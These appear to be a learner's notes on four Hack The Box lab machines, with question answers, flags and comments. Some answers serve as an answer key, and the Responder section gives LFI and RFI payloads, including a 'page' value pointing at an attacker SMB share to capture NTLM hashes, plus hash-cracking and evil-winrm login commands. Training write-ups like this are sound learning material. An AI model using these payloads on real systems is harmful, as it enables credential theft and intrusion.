---
created: 2022-05-27T18:52:36+10:00
updated: 2022-08-29T01:02:02+10:00
---
# Appointment
[[sql]] [[sqli]] [[mariadb]]

1. [x] What does the acronym SQL stand for?
    - `structured query language`
2. [x] What is one of the most common type of SQL vulnerabilities?
    - `sql injection`
3. [x] What does PII stand for?
    - honestly no clue, probably something related to personal information, though i did learn this before <.<
    - - **`personally identifiable information`**
4. [x] What does the OWASP Top 10 list name the classification for this vulnerability?
    - also no idea, haven't really looked in depth at owasp
    - **`A03:2021-injection`**
        - le what
5. [x] What service and version are running on port 80 of the target?
    - `Apache httpd 2.4.38 ((Debian))`
6. [x] What is the standard port used for the HTTPS protocol?
    - `443`
7. [x] What is one luck-based method of exploiting login pages?
    - `brute-forcing`
    - honestly had to think about this one for a moment
8. [x] What is a folder called in web-application terminology?
    - `directory`
9. [x] What response code is given for "Not Found" errors?
    - `404`
10. [x] What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?
    - `dir`
    - why does this not surprise me
11. [x] What symbol do we use to comment out parts of the code?
    - `#`
    - ~~probably~~
12. [x] Submit Flag
    - can't seem to find anything so i had to go through the walkthrough :|
    - ...
    - turns out they've been using `#` as their sql escape sequence... i swear it was normally `--` and that this was just a red herring
    - `e3d0796d002a446c0e622226f42e9672`

## Thoughts
i really feel irritated that it took me over an hour to not realise something this simple

# Sequel
[[sql]] [[mariadb]] [[weak password]]
1. What does the acronym SQL stand for?
    - `structured query language`
2. During our scan, which port running mysql do we find?
    - `3306`
3. What community-developed MySQL version is the target running?
    - `mariadb`
4. What switch do we need to use in order to specify a login username for the MySQL service?
    - `-u`
5. Which username allows us to log into MariaDB without providing a password?
    - `root`
6. What symbol can we use to specify within the query that we want to display everything inside a table?
    - `*`
7. What symbol do we need to end each query with?
    1. `;`
8. Submit Flag
    - `7b4bec00d1a39e3dd4e021ec3d915da8`

## Thoughts
This one was amusingly easy, especially after the last box

# Crocodile
[[php]] [[ftp]]
1. What nmap scanning switch employs the use of default scripts during a scan?
    - `-sC`
2. What service version is found to be running on port 21?
    - `vsftpd 3.0.3`
3. What FTP code is returned to us for the "Anonymous FTP login allowed" message?
    - `230`
4. What command can we use to download the files we find on the FTP server?
    - `get`
5. What is one of the higher-privilege sounding usernames in the list we retrieved?
    - `admin`
6. What version of Apache HTTP Server is running on the target host?
    - `2.4.41`
7. What is the name of a handy web site analysis plug-in we can install in our browser?
    - `wappalyzer`
8. What switch can we use with gobuster to specify we are looking for specific filetypes?
    - `-x`
9. What file have we found that can provide us a foothold on the target?
    - `login.php`
    - didn't need gobuster/wappalyzer to find this
10. Submit Flag
    - `c7110277ac44d78b6a9fff2232434d16`

# Responder
[[smb]] [[enumeration]] [[apache]] [[winrm]]

1. How many TCP ports are open on the machine?
    - `3`
2. When visiting the web service using the IP address, what is the domain that we are being redirected to?
    - `unika.htb`
3. Which scripting language is being used on the server to generate webpages?
    - `php`
4. What is the name of the URL parameter which is used to load different language versions of the webpage?
    - `page`
5. Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
    - `../../../../../../../../windows/system32/drivers/etc/hosts`
    - lol
6. Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
    - `//10.10.14.6/somefile`
    - also lol
    - from the walkthrough it turns out that you can even include [[smb|SMB]] shares with windows/php for some cursed reason
    - very useful: `?page=//myhost/file` while serving a SMB share with [[responder]]
7. What does NTLM stand for?
    - `new technology lan manager`
8. Which flag do we use in the Responder utility to specify the network interface?
    - `-I`
    - again with the walkthrough, learned that it can setup a malicious SMB server
    - useful for extracting hashed credentials into a file
9. There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.
    - `john the ripper`
    - `john -w=/usr/share/wordlists/somelist`
    - out came `badminton`
    - much to my surprise, this was instant, even under a vm
    - really goes to show how bad weak passwords are(and ntlmv2 hashes i guess)
10. What is the password for the administrator user?
    - `badminton`
11. We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
    - `5985`
    - had a guess at this because of the panda service
    - from walkthrough:
        - used [[evil-winrm]] to connect to the winrm service
        - `evil-winrm -i TARGET -u administrator -p badminton`
        - had trouble with directory listing to find anything and it turned out i had to (partially) recompile ruby with libreadline which thankfully wasn't hard
        - why this program doesn't have a proper directory listing i don't know (or it was somehow broken)
        - had to do some `download "` with tab completion to find the flag, wasn't very fun
        - `download .../flag.txt flag.txt` with dest filename otherwise it was gonna give it some funky name
12. Submit Flag
    - `ea81b7afddd03efaa0945333ed147fac`